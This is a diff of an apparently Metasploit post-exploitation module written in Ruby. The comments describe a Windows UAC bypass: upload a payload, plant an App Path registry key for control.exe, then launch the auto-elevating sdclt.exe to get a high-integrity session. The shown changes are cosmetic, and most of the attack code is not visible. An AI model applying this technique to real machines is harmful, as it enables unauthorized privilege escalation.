@@ -16,12 +16,13 @@
 #
 #
 # [ DESCRIPTION ]
-# "Bypasses UAC by abusing the App Path key for control.exe"
+# "Bypasses UAC by abusing the App Path registry key for control.exe"
 # This post-module will use an alternative method that also doesn’t rely on the
 # IFileOperation/DLL hijacking approach. This technique works on Windows 10 build 15031.
 # This module will upload your payload.exe, create the required registry entry in the current
 # user’s hive and runs sdclt.exe (hijacking the process being started to gain code execution).
 # "The 2º session will be executed in an higth-integrity context (allowing privilege escalation)"
+#
 #
 # NOTE:
 # Some Microsoft signed binaries auto-elevate themselfs due to their manifest like "sdclt.exe"
@@ -76,9 +77,9 @@
 
 
 
-# ----------------------------
+#
 # Module Dependencies/requires
-# ----------------------------
+#
 require 'rex'
 require 'msf/core'
 require 'msf/core/post/common'
@@ -88,9 +89,9 @@ require 'msf/core/post/windows/registry'
 
 
 
-# ----------------------------------
+#
 # Metasploit Class name and includes
-# ----------------------------------
+#
 class MetasploitModule < Msf::Post
       Rank = GreatRanking
 
@@ -102,9 +103,9 @@ class MetasploitModule < Msf::Post
 
 
 
-# -----------------------------------------
+#
 # Building Metasploit/Armitage info GUI/CLI
-# -----------------------------------------
+#
         def initialize(info={})
                 super(update_info(info,
                         'Name'          => 'Abusing the App Path key for control.exe [sdclt.exe]',
@@ -155,7 +156,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
-                        ], self.class) 
+                        ], self.class)
 
         end
 
@@ -359,7 +360,7 @@ def ls_vulncheck
   end
 
     #
-    # Check target registry hive/key existence ..
+    # Check for target registry hive/key existence ..
     #
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(2.0)
@@ -392,8 +393,8 @@ def ls_vulncheck
     end
 
   #
-  # display target registry settings to user ..
-  # i hope you are smart enouth to recognise a vulnerable output :D
+  # Display target registry settings to user ..
+  # I hope you are smart enouth to recognise a vulnerable output :D
   #
   print_line("")
   print_line("VULNERABLE_SOFT : sdclt.exe")
@@ -472,9 +473,10 @@ def run
     end
 
 
-# ------------------------------------
+
+#
 # Selected settings to run
-# ------------------------------------
+#
       if datastore['DEPLOY_PATH']
          ls_hijack
       end
